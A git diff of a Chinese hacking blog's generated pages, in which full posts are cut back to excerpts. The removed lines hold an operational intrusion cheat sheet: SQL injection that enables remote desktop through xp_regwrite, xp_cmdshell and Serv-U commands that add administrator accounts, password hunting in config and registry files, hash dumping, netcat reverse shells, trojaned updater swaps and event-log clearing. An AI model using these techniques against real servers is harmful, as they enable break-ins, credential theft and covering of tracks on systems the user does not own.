@@ -260,164 +260,15 @@
 关闭防火墙：net stop sharedaccess
 查看当前目录的所有文件：dir c:\windows\
 查看制定文件的内容：type c:\windows\1.asp
-把cmd.exe复制到c:\windows的temp目录下并命名为cmd.txt：copy c:\windows\temp\cookies\cmd.exe c:\windows\temp\cmd.txt</pre></code>
-
-<pre><code>开3389端口的命令：REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 0 /f
-查看补丁：dir c:\windows\>a.txt&(for %i in (KB952004.log KB956572.log KB2393802.log KB2503665.log KB2592799.log KB2621440.log KB2160329.log KB970483.log KB2124261.log KB977165.log KB958644.log) do @type a.txt|@find /i “%i”||[url=home.php?mod=space&uid=44]@echo[/url] %i Not Installed!)&del /f /q /a a.txt</pre></code>
-
-<pre><code>(( SQL语句直接开启3389 ))
-3389登陆关键注册表位置：HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\TerminalServer\DenyTSConnections
-其中键值DenyTSConnections 直接控制着3389的开启和关闭，当该键值为0表示3389开启，1则表示关闭。
-而MSSQL的xp_regwrite的存储过程可以对注册进行修改，我们使用这点就可以简单的修改DenyTSConnections键值，从而控制3389的关闭和开启。
-开启3389的SQL语句： syue.com/xiaohua.asp?id=100;exec master.dbo.xp_regwrite’HKEY_LOCAL_MACHINE’,'SYSTEM\CurrentControlSet\Control\Terminal Server’,'fDenyTSConnections’,'REG_DWORD’,0;–
-关闭3389的SQL语句： syue.com/xiaohua.asp?id=100;exec master.dbo.xp_regwrite’HKEY_LOCAL_MACHINE’,'SYSTEM\CurrentControlSet\Control\Terminal Server’,'fDenyTSConnections’,'REG_DWORD’,1;–
-2003可以实现一句话开3389： reg add “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp” /v PortNumber /t REG_DWORD /d 80 /f</pre></code>
-
-<p>(( 常见杀软 ))<br>360tray.exe 360实时保护<br>ZhuDongFangYu.exe 360主动防御<br>KSafeTray.exe 金山卫士 McAfee McShield.exe 麦咖啡<br>SafeDogUpdateCenter.exe 服务器安全狗</pre></code><br>(( windows提权中敏感目录和敏感注册表的利用 ))</p>
-<pre><code>敏感目录 目录权限 提权用途
-C:\Program Files\ 默认用户组users对该目录拥有查看权 可以查看服务器安装的应用软件 C:\Documents and Settings\All Users\「开始」菜单\程序 Everyone拥有查看权限 存放快捷方式，可以下载文件，属性查看安装路径 C:\Documents and Settings\All Users\Documents Everyone完全控制权限 上传执行cmd及exp C:\windows\system32\inetsrv\ Everyone完全控制权限 上传执行cmd及exp C:\windows\my.iniC:\Program Files\MySQL\MySQL Server 5.0\my.ini 默认用户组users拥有查看权限 安装mysql时会将root密码写入该文件 C:\windows\system32\ 默认用户组users拥有查看权限 Shift后门一般是在该文件夹，可以下载后门破解密码 C:\Documents and Settings\All Users\「开始」菜单\程序\启动 Everyone拥有查看权限 可以尝试向该目录写入vbs或bat，服务器重启后运行。 C:\RECYCLER\D:\RECYCLER\ Everyone完全控制权限 回收站目录。常用于执行cmd及exp C:\Program Files\Microsoft SQL Server\ 默认用户组users对该目录拥有查看权限 收集mssql相关信息，有时候该目录也存在可执行权限 C:\Program Files\MySQL\ 默认用户组users对该目录拥有查看权限 找到MYSQL目录中user.MYD里的root密码 C:\oraclexe\ 默认用户组users对该目录拥有查看权限 可以尝试利用Oracle的默认账户提权 C:\WINDOWS\system32\config 默认用户组users对该目录拥有查看权限 尝试下载sam文件进行破解提权 C:\Program Files\Geme6 FTP Server\Remote Admin\Remote.ini 默认用户组users对该目录拥有查看权限 Remote.ini文件中存放着G6FTP的密码 c:\Program Files\RhinoSoft.com\Serv-U\c:\Program Files\Serv-U\ 默认用户组users对该目录拥有查看权限 ServUDaemon.ini 中存储了虚拟主机网站路径和密码 c:\windows\system32\inetsrv\MetaBase.xml 默认用户组users对该目录拥有查看权限 IIS配置文件 C:tomcat5.0\conf\resin.conf 默认用户组users对该目录拥有查看权限 Tomat存放密码的位置 C:\ZKEYS\Setup.ini 默认用户组users对该目录拥有查看权限 ZKEYS虚拟主机存放密码的位置</pre></code>
-
-<pre><code>(( 提权中的敏感注册表位置 ))
-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\MSSQLServer\MSSQLServer\SuperSocketNetLib\Tcp Mssql端口 HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server DenyTSConnections 远程终端 值为0 即为开启 HKEY_LOCAL_MACHINE\SOFTWARE\MySQL AB\ mssql的注册表位置 HKEY_LOCAL_MACHINE\SOFTWARE\HZHOST\CONFIG\ 华众主机注册表配置位置 HKEY_LOCAL_MACHINE\SOFTWARE\Cat Soft\Serv-U\Domains\1\UserList\ serv-u的用户及密码（su加密）位置 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\TerminalServer\ WinStations\RDP-Tcp 在该注册表位置PortNumber的值即位3389端口值 HKEY_CURRENT_USER\Software\PremiumSoft\Navicat\Servers mysql管理工具Navicat的注册表位置，提权运用请谷歌 HKEY_LOCAL_MACHINE\SYSTEM\RAdmin\v2.0\Server\Parameters Radmin的配置文件，提权中常将其导出进行进行覆盖提权 HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Services\MSFtpsvc\Parameters\Virtual Roots\ IIS注册表全版本泄漏用户路径和FTP用户名漏洞 HKEY_LOCAL_MACHINE\software\hzhost\config\Settings\mastersvrpass 华众主机在注册表中保存的mssql、mysql等密码 HKEY_LOCAL_MACHINE\SYSTEM\LIWEIWENSOFT\INSTALLFREEADMIN\11 星外主机mssql的sa账号密码，双MD5加密 HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Services\MSFtpsvc\Parameters\Virtual Roots\ControlSet002 星外ftp的注册表位置，当然也包括ControlSet001、ControlSet003</pre></code>
-
-<pre><code>(( wscript.shell的删除和恢复 ))
-载wscript.shell对象，在cmd下或直接运行：regsvr32 /u %windir%\system32\WSHom.Ocx 卸载FSO对象，在cmd下或直接运行：regsvr32.exe /u %windir%\system32\scrrun.dll 卸载stream对象，在cmd下或直接运行：regsvr32 /s /u “C:\ProgramFiles\CommonFiles\System\ado\msado15.dll” 如果想恢复的话只需要去掉/U 即可重新再注册以上相关ASP组件，这样子就可以用了</pre></code>
-
-<pre><code>(( 如何找到准确的终端连接端口？))
-在aspx大马里，点击“系统信息”第三个就是目前的3389端口
-或是执行命令查看正在运行的服务：tasklist /svc
-找到：svchost.exe 1688 TermService
-记住1688这个ID值，
-查看开放的所有端口：netstat -ano
-找到1688这个ID值所对应的端口就是3389目前的端口</pre></code>
-
-<pre><code>(( iis6提权提示Can not find wmiprvse.exe的突破方法 ))
-突破方法一：
-在IIS环境下，如果权限做得不严格，我们在aspx大马里面是有权限直接结束wmiprvse.exe进程的，进程查看里面直接K掉
-在结束之后，它会再次运行，这时候的PID值的不一样的。这时候我们回来去运行exp，直接秒杀。
-突破方法二：
-虚拟主机，一般权限严格限制的，是没权限结束的，这时候我们可以考虑配合其他溢出工具让服务器强制重启，比如“直接使服务器蓝屏重启的东东”
-甚至可以暴力点，DDOS秒杀之，管理发现服务器不通了首先肯定是以为服务器死机，等他重启下服务器（哪怕是IIS重启下）同样秒杀之。</pre></code>
-
-<pre><code>(( 本地溢出提权 ))
-计算机有个地方叫缓存区,程序的缓存区长度是被事先设定好的,如果用户输入的数据超过了这个缓存区的长度,那么这个程序就会溢出了.
-缓存区溢出漏洞主要是由于许多软件没有对缓存区检查而造成的.
-利用一些现成的造成溢出漏洞的exploit通过运行,把用户从users组或其它系统用户中提升到administrators组.
-想要执行cmd命令，就要wscript.shell组建支持，或是支持aspx脚本也行，因为aspx脚本能调用.net组件来执行cmd的命令.</pre></code>
-
-<pre><code>(( sa提权 ))
-扫描开放的端口，1433开了就可以找sa密码提权，用大马里的搜索文件功能，sa密码一般在conn.asp config.asp web.config 这三个文件
-也可以通过注册表找配置文件，看下支持aspx不，支持的话跨目录到别的站点上找，找到之后用aspshell自带的sql提权登录再执行命令创建用户即可。
-aspx马提权执行命令有点不一样，点击数据库管理–选MSSQL–server=localhost;UID=sa;PWD=;database=master;Provider=SQLOLEDB–输入帐号密码连接即可
-增加一个用户：exec master.dbo.xp_cmdshell ‘net user jianmei daxia.asd /add’;– 提升为管理员：exec master.dbo.xp_cmdshell ‘net localgroup administrators jianmei /add’;–
-PS:如果增加不上，说明是xp_cmdshell组建没有，增加xp_cmdshell组建：Use master dbcc addextendedproc(‘xp_cmdshell’,'xplog70.dll’)
-【 1433一句话开3389 】
-Exec master.dbo.xp_regwrite’HKEY_LOCAL_MACHINE’,'SYSTEM\CurrentControlSet\Control\Terminal Server’,'fDenyTSConnections’,'REG_DWORD’,0;–</pre></code>
-<pre><code>(( root提权 ))
-利用mysql提权的前提就是,服务器安装了mysql,mysql的服务没有降权,是默认安装以系统权限继承的(system权限). 并且获得了root的账号密码
-如何判断一台windows服务器上的mysql有没有降权？ cmd命令net user 如果存在 mysql mssql这样用户或者类似的.通常就是它的mssql mysql服务已经被降权运行了
-如何判断服务器上是否开启了mysql服务？ 开了3306端口，有的管理员会把默认端口改掉.另一个判断方法就是网站是否支持php,一般支持的话都是用mysql数据库的.
-如何查看root密码？ 在mysql的安装目录下找到user.myd这个文件，root就藏在里面，一般是40位cmd加密，一些php网站安装的时候用的是root用户,在conn.asp config.asp这些文件里。 有时会显得很乱，这时就需要自己去组合，前17位在第一行可以找到，还有23位在第三行或是其他行，自己继续找。
-可以直接用php脚本里“mysql执行”，或是上传个UDF.php，如果网站不支持PHP，可以去旁一个php的站，也可以把UDF.php上传到别的phpshell上也可以。
-填入帐号密码之后，自然就是安装DLL了，点击“自动安装Mysql BackDoor” 显示导出跟创建函数成功后，紧接着执行增加用户的命令即可。
-注意：5.0版本以下(包括5.0的)默认c:\windows\系统目录就可以了，5.1版本以上的不能导出到系统目录下创建自定义函数，只能导出在mysql安装目录下的lib/plugin目录中
-例如：D:/Program Files/MySQL/MySQL Server 5.1/lib/plugin/mysql.dll
-如果密码看不见，或是组合不到40位，就本地安装一个mysql吧， 1、停止mysql服务 2、替换下载下来的3个文件（user.MYI user.MYD user.frm） 3、cmd切换到bin目录下，进入mysql安全模式，cmd命令：mysqld-nt –skip-grant-tables 4、重新打开一个cmd 切换到bin目录下，cmd命令：mysql -u root 版本不同有可能是：mysql -uroot -proot 5、最后查询一下就出来了select user,password from mysql.user;</pre></code>
-
-<pre><code>(( serv-u提权 ))
-这个文件里包含serv-u的md5密码：C:\Program Files\RhinoSoft.com\Serv-U\\ServUDaemon.ini
-找到这个文件：ServUDaemon.ini 打开找到：LocalSetupPassword=nqFCE64E0056362E8FCAF813094EC39BC2
-再拿md5密文去解密，再用现在的密码登陆提权即可。
-serv-u提权的前提是43958端口开了，且知道帐号密码！
-如果帐号密码默认，直接用shell里面的serv-u提权功能即可搞定，建议用aspx马、php马去提权，因为可以看回显。
-530说明密碼不是默认的,回显330说明成功，900说明密码是默认的……………..
-在程序里找个快捷方式，或是相关的文件进行下载到本地，再查看文件的属性，就可以找到serv-u的安装目录了。</pre></code>
-
-<pre><code>目录有修改权限之serv-u提权：
-找到serv-u的目录，再找到用户的配置文件ServUDaemon.ini，直接增加一个用户代码，保存！
-接着本地cmd命令：ftp 服务器ip
-回车，输入帐号密码再回车………………….
-接着先试试普通的cmd命令提权，不行的话就使用ftp提权的命令：
-Quote site exec net user jianmei daxia /add 增加一个用户
-Quote site exec net localgroup administrators jianmei /add 提升到管理员权限
-200 EXEC command successful (TID=33). 执行成功的回显信息
-Maintenance=System 权限类型多加一行指定新加帐号为系统管理员
-ReloadSettings=True 在修改ini文件后需加入此项，这时serv-u会自动刷新配置文件并生效</pre></code>
-<pre><code>(( 星外提权 ))
-如何知道是不是星外主机？
-第一：网站物理路径存在“freehost” 第二：asp马里点击程序，存在“7i24虚拟主机管理平台”“星外主机”之类的文件夹
-默认帐号：freehostrunat 默认密码：fa41328538d7be36e83ae91a78a1b16f!7
-freehostrunat这个用户是安装星外时自动建立的，已属于administrators管理组，而且密码不需要解密，直接登录服务器即可
-星外常写目录：
-C:\RECYCLER\ C:\windows\temp\ e:\recycler\ f:\recycler\ C:\php\PEAR\ C:\WINDOWS\7i24.com\FreeHost C:\php\dev C:\System Volume Information C:\7i24.com\serverdoctor\log\ C:\WINDOWS\Temp\ c:\windows\hchiblis.ibl C:\7i24.com\iissafe\log\ C:\7i24.com\LinkGate\log C:\Program Files\Thunder Network\Thunder7\ C:\Program Files\Thunder Network\Thunder\ C:\Program Files\Symantec AntiVirus\SAVRT\ c:\windows\DriverPacks\C\AM2 C:\Program Files\FlashFXP\ c:\Program Files\Microsoft SQL Server\90\Shared\ErrorDumps\ C:\Program Files\Zend\ZendOptimizer-3.3.0\ C:\Program Files\Common Files\ c:\Documents and Settings\All Users\Application Data\Hagel Technologies\DU Meter\log.csv c:\Program Files\360\360Safe\deepscan\Section\mutex.db c:\Program Files\Helicon\ISAPI_Rewrite3\error.log c:\Program Files\Helicon\ISAPI_Rewrite3\Rewrite.log c:\Program Files\Helicon\ISAPI_Rewrite3\httpd.conf c:\Program Files\Common Files\Symantec Shared\Persist.bak c:\Program Files\Common Files\Symantec Shared\Validate.dat c:\Program Files\Common Files\Symantec Shared\Validate.dat C:\Program Files\Zend\ZendOptimizer-3.3.0\docs C:\Documents and Settings\All Users\DRM\ C:\Documents and Settings\All Users\Application Data\McAfee\DesktopProtection C:\Documents and Settings\All Users\Application Data\360safe\softmgr\ C:\Program Files\Zend\ZendOptimizer-3.3.0\lib\Optimizer-3.3.0\php-5.2.x\ZendOptimizer.dll C:\Documents and Settings\All Users\Application Data\Microsoft\Media Index\</pre></code>
-
-<pre><code>ee提权法：
-找个可读可写目录上传ee.exe
-cmd命令：/c c:\windows\temp\cookies\ee.exe -i （获取星外帐号的id值，例如回显：FreeHost ID：724）
-接着命令：/c c:\windows\temp\cookies\ee.exe -u 724 （获取星外的帐号密码）</pre></code>
-
-<pre><code>vbs提权法：
-找个可读可写目录上传cscript.exe iispwd.vbs
-cmd命令：/c “c:\windows\temp\cookies\cscript.exe” c:\windows\temp\cookies\iispwd.vbs
-意思是读取iis，这样一来，不但可以获取星外的帐号密码，还可以看到同服务器上的所有站点的目录。
-可行思路大全：
-经测试以下目录中的文件权限均为everyone，可以修改，可以上传同文件名替换，删除，最重要的是还可以执行：
-360杀毒db文件替换: c:\Program Files\360\360SD\deepscan\Section\mutex.db c:\Program Files\360\360Safe\deepscan\Section\mutex.db C:\Program Files\360\360Safe\AntiSection\mutex.db
-IISrewrite3 文件替换： C:\Program Files\Helicon\ISAPI_Rewrite3\Rewrite.log C:\Program Files\Helicon\ISAPI_Rewrite3\httpd.conf C:\Program Files\Helicon\ISAPI_Rewrite3\error.log
-诺顿杀毒文件替换: c:\Program Files\Common Files\Symantec Shared\Persist.bak c:\Program Files\Common Files\Symantec Shared\Validate.dat c:\Program Files\Common Files\Symantec Shared\Persist.Dat
-一流过滤相关目录及文件： C:\7i24.com\iissafe\log\startandiischeck.txt C:\7i24.com\iissafe\log\scanlog.htm
-其他: Zend文件替换：C:\Program Files\Zend\ZendOptimizer-3.3.0\lib\Optimizer-3.3.0\php-5.2.x\ZendOptimizer.dll 华盾文件替换：C:\WINDOWS\hchiblis.ibl Flash文件替换：C:\WINDOWS\system32\Macromed\Flash\Flash10q.ocx DU Meter流量统计信息日志文件替换：c:\Documents and Settings\All Users\Application Data\Hagel Technologies\DU Meter\log.csv</pre></code>
-
-<pre><code>(( 360提权 ))
-找个可读可写目录上传360.exe
-cmd命令：/c c:\windows\temp\cookies\360.exe
-会提示3段英文： 360 Antivirus Privilege Escalation Exploit By friddy 2010.2.2 You will get a Shift5 door! Shift5 Backdoor created! 这是成功的征兆，接着连接服务器连按5下shift键，将弹出任务管理器，点击新建任务：explorer.exe 会出现桌面，接下来大家都会弄了……</pre></code>
-
-<pre><code>(( 搜狗提权 ))
-
-搜狗的目录默认是可读可写的，搜狗每隔一段时间就会自动升级，而升级的文件是pinyinup.exe
-
-我们只要把这个文件替换为自己的远控木马，或是添加账户的批处理，等搜狗升级的时候，就可以达成我们的目的了。</pre></code>
-
-<pre><code>(( 华众虚拟主机提权 ))
-就经验来说，一般溢出提权对虚拟主机是无果的，而且华众又没有星外那么明显的漏洞。
-所以华众提权关键之处就是搜集信息，主要注册表位置：
-HKEY_LOCAL_MACHINE\SOFTWARE\HZHOST\CONFIG\ HKEY_LOCAL_MACHINE\software\hzhost\config\settings\mysqlpass root密码 HKEY_LOCAL_MACHINE\software\hzhost\config\settings\mssqlpss sa 密码
-c:\windows\temp 下有hzhost主机留下的ftp登陆记录有用户名和密码
-以上信息配合hzhosts华众虚拟主机系统6.x 破解数据库密码工具使用
-百度搜索：hzhosts华众虚拟主机系统6.x 破解数据库密码工具</pre></code>
-
-<pre><code>(( N点虚拟主机 ))
-N点虚拟主机管理系统默认数据库地址为：\host_date\#host # date#.mdb
-rl直接输入不行 这里咱们替换下 #=%23 空格=%20
-修改后的下载地址为/host_date/%23host%20%23%20date%23196.mdb
-N点数据库下载之后找到sitehost表 FTPuser&FTPpass 值 FTPpass是N点加密数据然后用N点解密工具解密得到FTP密码
-N点默认安装路径C:\Program Files\NpointSoft\npointhost\web\ D:\Program Files\NpointSoft\npointhost\web\ 默认权限可读。遇到对方所用虚拟主机是N点时候 可以考虑 读取该文件夹下载数据库
-N点解密工具代码 <% set iishost=server.CreateObject(“npoint.host”)
-x=iishost.Eduserpassword(“FTPpass值”,0)
-response.write x %>
-本地搭建N点环境在N点目录打开访问即可。得到密码减去后10位字符即为 N点的虚拟主机管理密码。 然后需要在管理系统登陆确认下 在hostcs 表 找到 Hostip 或者hostdomain 一般默认是 Hostip=127.0.0.1 hostdomain=www.npointhost.com 这里可以不管 因为 这里不修改的话就是服务器默认ip地址sitehost 表的host_domain就是绑定的域名 直接查下IP地址即可 咱们批量的话 扫描的地址即可。 管理系统地址即为IP地址 选择虚拟主机 登录即可 接下来传shell大家应该都会了。 接下来说提权 hostcs表存有sa root账户的密码 解密方法一样。默认都是 解密结果123456 还有就是在adminlogo 存在N点系统管理密码 30位的cfs加密可以在http://www.md5.com.cn/cfs 碰撞下试试 或者用asm的工具破解下我的运气不好没成功过 3057C0DB854C878E72756088058775 这个是默认admin的密码</pre></code>
-
-<pre><code>(( 脱库 ))
-asp 程序的网站一般不是access就是msssql，access数据库脱裤很简单，直接下载数据库即可，mssql数据库可以用shell自带的脱裤功 能，找到数据库的连接信息，一般在web.config.asp里，然后连接一下SA，找到会员表（UserInfo）就可以了。
-PHP程序就是mysql了，找到root帐号密码，用PHP大马自己带链接功能连接一下，也自己自己上传PHP脱裤脚本，之后找到目标数据库（数据库名），再找到会员表menber进行脱裤即可。</pre></code>
-
-<pre><code>(( 服务器 ))
-命令提示符已被系统管理员停用？ 解决方法：运行→gpedit.msc→用户配置→管理模板→系统，在右侧找到”阻止命令提示符”, 然后双击一下,在”设置”里面选中”未配置” ,最后点击”确定”。
-如何判断服务器的类型？ 解决方法：直接ping服务器ip，看回显信息进行判断
-TTL=32 9X/ME
-TTL=64 linux
-TTL=128 2000X/XP
-TTL=255 UNIX
-为什么有时3389开放却不能连接？ 原因分析：有时候是因为防火墙，把3389转发到其他端口就可以连接了，有的转发后依然是连接不上，那是因为管理员在TCP/IP里设置的端口限制 解决方法：我们需要把端口转为TCP/IP里设置的只允许连接的端口其中一个就可以了，更好的办法是取消端口限制。
-
-最简单的往服务器上传东西方法是什么？ 本机打开“HFS网络文件服务器”这款工具，把需要上传的工具直接拖进左边第一个框内，复制上面的地址，到服务器里的浏览器访问，就可以下载了
-
-限 制“命令提示符”的运行权限？ 我的电脑（右键）–资源管理器中–点击“工具”按钮，选择“文件夹选项”，切换到“查看”标签，去掉“使用简单文件共享(推荐)”前面的钩，这一步是为了 让文件的属性菜单中显示“安全”标签，然后进入“c:\windows\system32\”，找到“cmd.exe”，点右键选择“属性”，切换到“安 全”标签，将其中“组或用户名称”中除了管理员外的所有用户都删除，完成后点“确定”这样当普通用户想运行“命令提示符”的时候将会出现“拒绝访问”的警 告框。
-
-如何更改windows2003最大连接数？ windows2003中的远程桌面功能非常方便，但是初始设置只允许2个用户同时登陆，有些时候因为我在公司连接登陆后断开，同事在家里用其他用户登陆 后断开，当我再进行连接的时候，总是报错“终端服务超过最大连接数”这时候我和同事都不能登陆，通过以下方法来增加连接数，运 行：services.msc，启用license logging，别忘了添加完毕后再关闭 License Logging 打开win2k3的控制面板中的“授权”，点“添加许可”输入要改的连接数
-
-如何清除服务器里的IP记录日志？ 1.我的电脑右键管理–事件查看器–安全性–右键清除所有事件 2.打开我的电脑–C盘–WINDOWS–system32–config–AppEvent.Evt属性–安全–全部都拒绝 3.Klaklog.evt属性–安全–全部都拒绝–SecEvent.Tvt属性–安全–全部都拒绝</pre></code>
+把cmd.exe复制到c:\windows的temp目录下并命名为cmd.txt：copy c:\windows\temp\cookies\cmd.exe c:\windows\temp\cmd.txt</code></pre>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2019/11/22/%E6%8F%90%E6%9D%83%E6%80%9D%E8%B7%AF%E4%BA%8C/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -486,54 +337,15 @@ TTL=255 UNIX
     <div class="post-body" itemprop="articleBody">
 
       
-          <pre><code>1、能不能执行cmd就看这个命令：net user，net不行就用net1，再不行就上传一个net到可写可读目录，执行/c c:\windows\temp\cookies\net1.exe user</pre></code>
-<pre><code>2、cmd命令：systeminfo，看看有没有KB952004、KB956572、KB970483这三个补丁，如果没有，第一个是pr提权，第二个是巴西烤肉提权，第三个是iis6.0提权</pre></code>
-<pre><code>3、cmd拒绝访问的话就自己上传一个cmd.exe 自己上传的后缀是不限制后缀的，cmd.exe/cmd.com/cmd.txt 都可以</pre></code>
-<pre><code>4、找sa密码或是root密码，直接利用大马的文件搜索功能直接搜索</pre></code>
-<pre><code>5、c:\windows\temp\cookies\ 这个目录</pre></code>
-<pre><code>6、当提权成功，3389没开的情况下，上传开3389的vps没成功时，试试上传rootkit.asp 用刚提权的用户登录进去就是system权限，再试试一般就可以了</pre></code>
-<pre><code>7、cmd执行exp没回显的解决方法：com路径那里输入exp路径C:\RECYCLER\pr.exe，命令那里清空(包括/c )输入”net user jianmei daxia /add”</pre></code>
-<pre><code>8、增加用户并提升为管理员权限之后，如果连接不上3389，上传rootkit.asp脚本，访问会提示登录，用提权成功的账号密码登录进去就可以拥有管理员权限了</pre></code>
-<pre><code>9、有时变态监控不让添加用户，可以尝试抓管理哈希值，上传“PwDump7 破解当前管理密码(hash值)”，俩个都上传，执行PwDump7.exe就可以了，之后到网站去解密即可</pre></code>
-<pre><code>10、有时增加不上用户，有可能是密码过于简单或是过于复杂，还有就是杀软的拦截，命令 tasklist 查看进程</pre></code>
-<pre><code>11、其实星外提权只要一个可执行的文件即可，先运行一遍cmd，之后把星外ee.exe命名为log.csv 就可以执行了</pre></code>
-<pre><code>12、用wt.asp扫出来的目录，其中红色的文件可以替换成exp，执行命令时cmd那里输入替换的文件路径，下面清空双引号加增加用户的命令</pre></code>
-<pre><code>13、当可读可写目录存在空格的时候，会出现这样的情况：’C:\Documents’ 不是内部或外部命令，也不是可运行的程序 或批处理文件。解决办法是利用菜刀的交互shell切换到exp路径，如：Cd C:\Documents and Settings\All Users\Application Data\Microsoft 目录 然后再执行exp或者cmd，就不会存在上面的情况了，aspshell一般是无法跳转目录的</pre></code>
-<pre><code>14、有时候可以添加用户，但是添加不到管理组，有可能是administrators改名了，net user administrator 看下本地组成员，*administrators</pre></code>
-<pre><code>15、进入服务器，可以继续内网渗透 这个时候可以尝试打开路由器 默认帐号密码 admin admin</pre></code>
-<pre><code>16.有的cmd执行很变态，asp马里，cmd路径填上面，下面填：”"c:\xxx\exp.exe “whoami” 记得前面加两个双引号，不行后面也两个，不行就把exp的路径放在cmd那里，下面不变</pre></code>
-<pre><code>17、一般增加不上用户，或是想添加增加用户的vbs,bat,远控小马到服务器的启动项里，用“直接使服务器蓝屏重启的东东”这个工具可以实现</pre></code>
-<pre><code>18.执行PwDump7.exe抓哈希值的时候，建议重定向结果到保存为1.txt /c c:\windows\temp\cookies\PwDump7.exe >1.txt</pre></code>
-<pre><code>19.菜刀执行的技巧，上传cmd到可执行目录，右击cmd 虚拟终端，help 然后setp c:\windows\temp\cmd.exe 设置终端路径为：c:\windows\temp\cmd.exe</pre></code>
-<pre><code>20.当不支持aspx，或是支持但跨不了目录的时候，可以上传一个读iis的vps，执行命令列出所有网站目录，找到主站的目录就可以跨过去了。 上传cscript.exe到可执行目录，接着上传iispwd.vbs到网站根目录，cmd命令/c “c:\windows\temp\cookies\cscript.exe” d:\web\iispwd.vbs</pre></code>
-<pre><code>21.如何辨别服务器是不是内网？ 192.168.x.x 172.16.x.x 10.x.x.x</pre></code>
-<pre><code>22.什么情况下适合转发端口？
-1.服务器是内网，我们无法连接。 2.服务器上有防火墙，阻断我们的连接。
-转发端口的前提，我们是外网或是有外网服务器。
-找个可读可写目录上传lcx.exe
-本地cmd命令：lcx.exe -listen 1988 4567 （监听本地1988端口并转发到4567端口）
-接着shell命令：/c c:\windows\temp\cookies\lcx.exe -slave 本机ip 1988 服务器ip 3389 （把服务器3389端口转发到本地4567端口）
-之后本地连接：127.0.0.1:4567 (如果不想加上:4567的话，本地执行命令的时候，把4567换成3389来执行就行了)
-
-以上是本机外网情况下操作，接着说下在外网服务器里如何操作：
-上传lxc.exe cmd.exe到服务器且同一目录，执行cmd.exe命令：lcx.exe -listen 1988 4567
-接着在aspxshell里点击端口映射，远程ip改为站点的ip，远端口程填1988，点击映射端口，接着在服务器里连接127.0.0.1:4567就可以了</pre></code>
-<pre><code>23.当可以执行net user，但是不能建立用户时，就可以用NC反弹提权试下，特别是内网服务器，最好用NC反弹提权。
-不过这种方法, 只要对方装了防火墙, 或是屏蔽掉了除常用的那几个端口外的所有端口，那么这种方法也失效了….
-找个可读可写目录上传nc.exe cmd.exe
--l 监听本地入栈信息
--p port打开本地端口
--t 以telnet形式应答入栈请求
--e 程序重定向
-本地cmd执行：nc -vv -l -p 52 进行反弹
-接着在shell里执行命令：c:\windows\temp\nc.exe -vv 服务器ip 999 -e c:\windows\temp\cmd.exe 最好是80或8080这样的端口，被防火墙拦截的几率小很多
-执行成功后本地cmd命令：cd/ （只是习惯而已）
-接着以telnet命令连接服务器：telnet 服务器ip 999
-回车出现已选定服务器的ip就说明成功了，接着权限比较大了，尝试建立用户！
-本地cmd执行：nc -vv -l -p 52 进行反弹 c:\windows\temp\nc.exe -e c:\windows\temp\cmd.exe 服务器ip 52
-shell执行命令c:\windows\temp\nc.exe -l -p 110 -t -e c:\windows\temp\cmd.exe
-一般这样的格式执行成功率很小，不如直接在cmd那里输入：c:\windows\temp\nc.exe 命令这里输入：-vv 服务器ip 999 -e c:\windows\temp\cmd.exe
-这个技巧成功率比上面那个大多了，不单单是nc可以这样，pr这些提权exp也是可以的</pre></code>
+          <pre><code>1、能不能执行cmd就看这个命令：net user，net不行就用net1，再不行就上传一个net到可写可读目录，执行/c c:\windows\temp\cookies\net1.exe user</code></pre><pre><code>2、cmd命令：systeminfo，看看有没有KB952004、KB956572、KB970483这三个补丁，如果没有，第一个是pr提权，第二个是巴西烤肉提权，第三个是iis6.0提权</code></pre>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2019/11/22/%E6%8F%90%E6%9D%83%E6%80%9D%E8%B7%AF%E4%B8%80/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -602,11 +414,7 @@ shell执行命令c:\windows\temp\nc.exe -l -p 110 -t -e c:\windows\temp\cmd.exe
     <div class="post-body" itemprop="articleBody">
 
       
-          <center>整体思路</center>
-<center>确认目标-信息搜集-网站/服务器入侵-提权-内网渗透-种马-清理痕迹</center>
-
-<p><img src="/images/pasted-45.png" alt="upload successful"></p>
-
+          <center>整体思路</center><center>确认目标-信息搜集-网站/服务器入侵-提权-内网渗透-种马-清理痕迹</center><p><img src="/images/pasted-45.png" alt="upload successful"></p>
       
     </div>
 
@@ -675,8 +483,7 @@ shell执行命令c:\windows\temp\nc.exe -l -p 110 -t -e c:\windows\temp\cmd.exe
     <div class="post-body" itemprop="articleBody">
 
       
-          <p>MYSQL数据库</p>
-<pre><code>• 默认端口：3306
+          <p>MYSQL数据库</p><pre><code>• 默认端口：3306
 • 攻击方法：
 • 爆破：弱口令
 • 身份认证漏洞：CVE-2012-2122
@@ -686,165 +493,15 @@ shell执行命令c:\windows\temp\nc.exe -l -p 110 -t -e c:\windows\temp\cmd.exe
 • 参考：
 • https://www.seebug.org/appdir/MySQL
 • http://www.waitalone.cn/mysql-tiquan-summary.html?replytocom=390
-•https://xz.aliyun.com/t/1491</pre></code>
-
-<p>MSSQL数据库</p>
-<pre><code>• 默认端口：1433（Server 数据库服务）、1434（Monitor 数据库监控）
-• 攻击方法：
-• 爆破：弱口令/使用系统用户
-• 注入
-• 参考：
-•https://www.anquanke.com/post/id/86011
-</pre></code>
-
-<p>Oracle数据库</p>
-<pre><code>• 默认端口：1521（数据库端口）、1158（Oracle EMCTL端口）、8080（Oracle XDB数据库）、210（Oracle XDB FTP服务）
-• 攻击方法：
-• 爆破：弱口令
-• 注入攻击；
-• 漏洞攻击； -参考：
-•https://www.leiphone.com/news/201711/JjzXFp46zEPMvJod.html
-</pre></code>
-
-<p>Postgresql数据库</p>
